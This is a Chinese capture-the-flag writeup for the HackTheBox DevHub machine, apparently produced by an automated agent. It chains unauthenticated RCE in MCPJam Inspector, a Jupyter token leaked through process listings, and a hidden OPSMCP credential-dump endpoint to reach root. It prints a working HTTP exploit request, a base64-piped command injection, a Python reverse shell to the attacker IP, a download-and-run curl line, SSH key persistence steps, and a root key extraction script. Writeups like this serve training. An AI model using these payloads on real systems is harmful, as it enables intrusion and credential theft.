# HTB DevHub Writeup — MCPJam 未授权 RCE → Jupyter Token 泄露 → OPSMCP 后门提权

> **靶场**: HackTheBox DevHub  
> **难度**: Medium  
> **系统**: Linux (Ubuntu 22.04 LTS, kernel 5.15.0-179)  
> **靶机 IP**: 10.129.5.14  
> **攻击机 IP**: 10.10.16.214  

---

## 概述

这是一个基于 HackTheBox 平台上 DevHub 靶机的完整攻击链分析。靶场演示了一个 Linux 环境渗透过程，通过 MCPJam Inspector 未授权 RCE 获取初始 Shell，利用 `ps aux` 进程命令行泄露的 Jupyter Token 横向移动至 analyst 用户，最终通过 OPSMCP 内部 API 后门（`ops._admin_dump`）提取 Root SSH 私钥，获得 root 权限。

---

## 工具清单

本靶场用到的工具：

| 工具 | 用途 | 获取方式 |
|------|------|----------|
| **fscan** | 全端口扫描 + 服务识别 | `go install github.com/shadow1ng/fscan@latest` 或 [Releases](https://github.com/shadow1ng/fscan/releases) |
| **nc** | 反弹 Shell 监听 | 系统自带，Windows 可用 [Nmap/ncat](https://nmap.org/ncat/) |
| **ssh-keygen** | 生成 SSH 密钥对 | 系统自带 |
| **openssh-client** | SSH 远程登录 + 端口转发 | 系统自带（Linux/Mac），Windows 需 OpenSSH 或 Git Bash |
| **Python3** | Jupyter 交互、反弹 Shell | 系统自带 |
| **curl.exe** | HTTP 请求 | 系统自带（Windows 下需显式调用 `curl.exe`，避免与 PS alias 冲突） |
| **浏览器** | JupyterLab UI 操作 | Chrome/Edge 即可 |

> **注意**: 6274 是非常用端口，nmap 默认 1000 端口扫描会漏掉，必须全端口扫描。fscan 指纹仅供参考——本例中 fscan 将 6274 误识别为 "Open Lighting Architecture daemon"，需通过手工访问确认实际服务。

---

## 技术知识点详解

### 1. MCPJam Inspector 未授权 RCE

MCPJam Inspector v1.4.2 的 `/api/mcp/connect` 端点设计为连接外部 MCP Server，但未做任何认证验证。该端点允许调用方提供 `command` + `args` 字段来启动任意本地进程作为 MCP Server。攻击者可传入 `"bash"` + `["-c", "恶意命令"]` 来实现盲 RCE（HTTP Response 只返回 MCP 协议错误，但命令已在目标上执行）。

### 2. 进程命令行信息泄露

Linux 下 `ps aux` 输出的进程命令行往往是信息泄露的重灾区。Jupyter、MySQL、PostgreSQL 等服务的启动参数中经常包含明文 Token 和密码。本例中 analyst 用户的 Jupyter Lab 进程命令行暴露了 `--ServerApp.token`。

### 3. JupyterLab 远程执行

JupyterLab 提供 REST API + WebSocket 接口，通过创建 Kernel 并发送执行消息，可以在 analyst 用户上下文中执行任意 Python 代码。实际测试中，**浏览器直接打开 JupyterLab UI（通过 SSH 端口转发）比 Python WebSocket 脚本更稳定可靠**，特别在 Windows 攻击机上。

### 4. OPSMCP 内部 API 后门提权

OPSMCP 是一个 Flask 应用，运行在 `127.0.0.1:5000` 且以 root 权限启动。源码中硬编码了 API Key，并隐藏了 `ops._admin_dump` 端点——参数虽写 `"target": "string"`，但代码内有限制为 `ssh_keys/passwords/tokens`，猜测是开发者故意留的后门。

### 5. SSH 端口转发内网穿透

通过 `ssh -L` 将靶机内网服务映射到攻击机本地，无需在靶机上安装任何工具即可直接调用内网 API。

---

## 攻击步骤详细解析

### 第一步：信息收集与端口扫描

使用 fscan 进行全端口扫描：

```bash
fscan -h 10.129.5.14 -p 1-65535 -nopoc
```

开放端口：

| 端口 | 服务 | fscan 指纹 | 实际服务 |
|------|------|-----------|---------|
| 22 | SSH | OpenSSH 8.9p1 Ubuntu | ✅ 准确 |
| 25 | SMTP | (未识别版本) | Postfix |
| 80 | HTTP | nginx 1.18.0 | ✅ 准确 |
| 110 | POP3 | (未识别版本) | Dovecot |
| 143 | IMAP | (未识别版本) | Dovecot |
| 6274 | HTTP | ⚠️ Open Lighting Architecture daemon | **MCPJam Inspector v1.4.2** |

> **教训**：fscan 将 6274 误识别为 "Open Lighting Architecture daemon"。全端口扫描不能只看工具自动指纹，关键端口必须手工访问验证。

访问 `http://10.129.5.14/`，Nginx 返回 **302 重定向**到 `http://devhub.htb/`。写入 hosts：

```
10.129.5.14 devhub.htb
```

再次访问 `http://devhub.htb/`，看到 DevHub 首页，列举了三个服务卡片：
- **MCP Inspector** — Active, Port 6274
- **Analytics Dashboard** — Internal Only, localhost:8888
- **Code Repository** — Maintenance Mode

> ⚠️ 页面底部写 "Ubuntu 24.04"，但 kernel 5.15.0-179 实际对应 **Ubuntu 22.04 LTS**。不要被前端页面误导，以 `uname -a` 为准。

---

### 第二步：MCPJam Inspector 未授权 RCE 获取初始 Shell

#### 漏洞分析

MCPJam Inspector v1.4.2 的 Web 前端是 React SPA（可从 `/assets/index-*.js` 确认）。前端调用 `/api/mcp/connect` 来连接外部 MCP Server。但后端没有对 `command` + `args` 做任何校验，直接 `spawn()` 了用户提供的命令。

通过 `ps aux` 可以确认进程链：

```
mcp-dev → npm start → npx @mcpjam/inspector@1.4.2 → node /opt/mcpjam/node_modules/@mcpjam/inspector/dist/server/index.js
```

#### PoC

```http
POST /api/mcp/connect HTTP/1.1
Host: 10.129.5.14:6274
Content-Type: application/json

{
  "serverConfig": {
    "command": "bash",
    "args": ["-c", "id > /tmp/pwned; whoami >> /tmp/pwned"],
    "env": {}
  },
  "serverId": "evil"
}
```

服务端返回 `500 / MCP error -32000: Connection closed`，这是因为 bash 的 stdout 不是合法的 MCP 协议响应。**但命令已经在目标上以 mcp-dev 身份执行了**——典型的"盲 RCE"场景。

#### 写入 SSH 公钥获取持久化

生成密钥对：

```bash
ssh-keygen -t rsa -b 2048 -f loot/id_rsa_devhub
```

通过 Base64 编码消除 JSON 特殊字符问题：

```python
import base64
cmd = "mkdir -p ~/.ssh; echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys"
payload = base64.b64encode(cmd.encode()).decode()
# 然后通过 /api/mcp/connect 发送: echo <payload> | base64 -d | bash
```

> Windows 用户注意：PowerShell 中 `curl` 是 `Invoke-WebRequest` 的别名，需使用 `curl.exe` 或 `Invoke-RestMethod`。

SSH 登录验证：

```bash
ssh -i loot/id_rsa_devhub mcp-dev@10.129.5.14
```

#### 反弹 Shell（备选方案）

```bash
# 攻击机监听
nc64.exe -lvnp 4444

# 通过 /api/mcp/connect 发送 Base64 编码的 Python 反弹 Shell：
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.16.214",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

---

### 第三步：内网侦察与 Jupyter Token 泄露

#### 基本信息收集

```bash
id        # uid=1001(mcp-dev) gid=1001(mcp-dev)
uname -a  # Linux devhub 5.15.0-179-generic
hostname  # devhub
ss -tlnp
```

#### 内部服务发现

| 端口 | 服务 | 绑定 | 进程用户 |
|------|------|------|----------|
| 80 | Nginx | 0.0.0.0 | www-data |
| 6274 | MCPJam Inspector (@mcpjam/inspector@1.4.2) | 0.0.0.0 | mcp-dev |
| 5000 | OPSMCP (Flask) | 127.0.0.1 | root |
| 8888 | Jupyter Lab | 127.0.0.1 | analyst |

关键发现：8888 和 5000 只监听 localhost，需要端口转发。

#### 用户结构

```
root
├── mcp-dev (uid=1001) — 当前用户，运行 MCPJam Inspector
└── analyst (uid=1002) — 运行 Jupyter Lab + OPSMCP
```

`/home/analyst/` 无法直接访问（权限 `drwxr-x---`）。

#### Jupyter Token 泄露

`ps aux` 发现 analyst 的 Jupyter Lab 进程命令行中泄露了 token：

```bash
/home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab \
  --ip=127.0.0.1 --port=8888 --no-browser \
  --notebook-dir=/home/analyst/notebooks \
  --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 \
  --ServerApp.password= \
  --ServerApp.disable_check_xsrf=False
```

同时 OPSMCP 进程也清晰可见：

```bash
root  1078  ...  /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

---

### 第四步：SSH 端口转发与 Jupyter 横向移动（获取 user flag）

#### SSH 端口转发

```bash
ssh -i loot/id_rsa_devhub -L 8888:127.0.0.1:8888 -L 5000:127.0.0.1:5000 -N mcp-dev@10.129.5.14
```

#### Jupyter 代码执行（推荐方式：浏览器 + UI）

直接浏览器打开 `http://localhost:8888/lab?token=<TOKEN>`，新建 Python 3 Notebook，填入下方代码后 Shift+Enter 执行——比 WebSocket 脚本方式更稳定可靠：

```python
import subprocess
r = subprocess.run(['cat', '/home/analyst/user.txt'], capture_output=True, text=True)
print('USER_FLAG:', r.stdout.strip())
```

#### 备选方式：通过 mcp-dev SSH 下载执行脚本

```bash
# 攻击机
python -m http.server 8080

# mcp-dev Shell
curl http://10.10.16.214:8080/get_user.py -o /tmp/g.py && python3 /tmp/g.py
```

> **Windows 实战经验**：Python `websocket-client` 在 Windows PowerShell 下执行 Jupyter WebSocket API 可能不稳定（超时、丢消息），推荐优先用浏览器直接操作 JupyterLab UI，或通过 mcp-dev SSH 中转执行。

**User Flag 位于 `/home/analyst/user.txt`**，以 analyst 身份读取，拿到第 1 个 flag。

---

### 第五步：OPSMCP 源码审计发现后门

在 Jupyter Kernel 中读取完整源码：

```python
import subprocess
r = subprocess.run(['cat', '/opt/opsmcp/server.py'], capture_output=True, text=True)
print(r.stdout)
```

源码关键部分（已脱敏）：

```python
# API Key for authentication
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

# Registered tools (visible — 对外暴露)
VISIBLE_TOOLS = {
    "ops.system_status": {"description": "Get system status and health metrics", "parameters": {}},
    "ops.list_services": {"description": "List running services", "parameters": {}},
    "ops.check_disk":   {"description": "Check disk usage", "parameters": {}},
    "ops.view_logs":    {"description": "View recent system logs", "parameters": {"service": "string"}},
}

# Hidden tools (not in /tools/list but callable — 隐藏端点)
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {
        "description": "Enable debug mode",
        "parameters": {}
    }
}
```

`ops._admin_dump` 的 `target` 参数写的是 `"string"`，但在代码执行体中做了枚举限制，实际支持三个值：

| target | 内容 |
|--------|------|
| `ssh_keys` | `/root/.ssh/id_rsa` — Root SSH 私钥 |
| `passwords` | mcp-dev / analyst / root 密码 |
| `tokens` | admin_token + service_token |

---

### 第六步：利用 OPSMCP 后门提取 Root SSH 私钥

通过端口转发直接调用 OPSMCP API（Windows 下用 `curl.exe` 或 `Invoke-RestMethod`）：

```bash
curl -X POST http://localhost:5000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

响应中包含 `/root/.ssh/id_rsa` 的完整私钥。`ops._admin_dump` 还支持读取其他凭据：

- `target=passwords` → `mcp-dev:Mcp!Insp3ct0r2026`、`analyst:JupyterN0tebook!2026`、`root:$6$...`
- `target=tokens` → `admin_token` + `service_token`

---

### 第七步：Root SSH 登录获取 root flag

**Windows 注意**：OpenSSH 对私钥文件权限有严格要求。直接用 PowerShell 写入的私钥可能会被拒绝加载（`Load key: invalid format` 或 `bad permissions`）。**推荐直接在靶机上操作**——通过 mcp-dev SSH 下载脚本，在靶机本地用 OPSMCP API 获取 key 后 `ssh root@127.0.0.1`：

```bash
# 在 mcp-dev Shell 中
python3 -c "
import json, urllib.request, os, subprocess
req = urllib.request.Request('http://localhost:5000/tools/call',
    data=json.dumps({'name':'ops._admin_dump','arguments':{'target':'ssh_keys','confirm':True}}).encode(),
    headers={'Content-Type':'application/json','X-API-Key':'opsmcp_secret_key_4f5a6b7c8d9e0f1a'})
key = json.loads(urllib.request.urlopen(req).read())['root_private_key']
with open('/tmp/rk','w') as f: f.write(key)
os.chmod('/tmp/rk',0o600)
r = subprocess.run(['ssh','-i','/tmp/rk','-o','StrictHostKeyChecking=no','root@127.0.0.1','cat /root/root.txt'], capture_output=True, text=True)
print('ROOT_FLAG:', r.stdout.strip())
"
```

**Root Flag 位于 `/root/root.txt`**，拿到第 2 个 flag。

---

## 完整攻击树

```
10.129.5.14:6274 (MCPJam Inspector v1.4.2)
  │
  ├─ /api/mcp/connect 未认证 RCE
  │   └─ mcp-dev Shell (uid=1001)
  │       │
  │       ├─ 写入 ~/.ssh/authorized_keys → SSH 持久化
  │       │
  │       ├─ ps aux 发现 Jupyter Token 泄露
  │       │   └─ SSH -L 端口转发 → JupyterLab UI / 脚本执行
  │       │       └─ /home/analyst/user.txt (user flag)
  │       │
  │       └─ Jupyter Kernel 读取 /opt/opsmcp/server.py 源码
  │           └─ 硬编码 API Key + ops._admin_dump 后门
  │               └─ dump root SSH 私钥 → 靶机本地 ssh root@127.0.0.1
  │                   └─ /root/root.txt (root flag)
  │
  └─ [辅助] Python3 反弹 Shell (nc 监听)
```

---

## 关键路径回顾

| 阶段 | 操作 | 用户 |
|------|------|------|
| 初始 RCE | MCPJam `/api/mcp/connect` 命令注入 | `mcp-dev` |
| 持久化 | 写 SSH authorized_keys | `mcp-dev` |
| 信息收集 | `ps aux` 发现 Jupyter Token | `mcp-dev` |
| 横向移动 | SSH 端口转发 + JupyterLab 代码执行 | `analyst` |
| 读 user flag | `cat /home/analyst/user.txt` | `analyst` |
| 信息收集 | 读 `/opt/opsmcp/server.py` 源码 | `analyst` |
| 提权 | OPSMCP `ops._admin_dump` dump root SSH key | `root` |
| 读 root flag | 靶机本地 `ssh -i /tmp/rk root@127.0.0.1` → `cat /root/root.txt` | `root` |

---

## 技巧总结

1. **Blind RCE 的 Base64 传输**：JSON 协议中传递 shell 命令时，Base64 编码可消除引号转义问题

   ```
   ❌ "args": ["-c", "echo 'it\"s broken' >> /tmp/x"]
   ✅ "args": ["-c", "echo <B64> | base64 -d | bash"]
   ```

2. **`/dev/tcp` 不可靠时用 Python3 反弹 Shell**：非交互式 bash 不启用 `/dev/tcp` 设备

3. **进程命令行是金矿**：拿到初始 Shell 后第一件事就是 `ps aux`，比翻配置文件更高效

4. **内部 API 往往更脆弱**：localhost 服务（OPSMCP on 5000）通常缺乏安全审计

5. **SSH 端口转发是内网穿透利器**：一个 SSH 连接暴露整个内网

6. **Windows 攻击机注意事项**：
   - `curl` 是 PowerShell alias → 用 `curl.exe` 或 `Invoke-RestMethod`
   - SSH 私钥权限 → 靶机本地操作比配置 Windows ACL 更省事
   - Jupyter WebSocket（`websocket-client`）→ 浏览器直接操作 UI 更稳定

7. **fscan 指纹仅供参考**：6274 被误识别为 OLA，关键端口必须手工确认

---

## 总结

本案例展示了从一个非常用端口（6274）上的 MCPJam Inspector 未授权 RCE 开始，通过写入 SSH 公钥获得持久化 Shell。利用 `ps aux` 进程命令行信息泄露发现 Jupyter Token，借助 SSH 端口转发通过 JupyterLab 横向移动至 analyst 用户。最后审计 OPSMCP 内部 API 源码，发现硬编码 API Key 和 `ops._admin_dump` 后门端点，在靶机本地完成 SSH 私钥提取和 root 登录。

安全要点：非标端口服务同样需要严格认证、进程命令行不应包含敏感参数、内部 API 不能因"仅监听 localhost"就放松安全控制、源码中硬编码凭据和后门功能是致命隐患。

---

*Writeup by HTB-Skill Automated Agent | 2026-05-31*
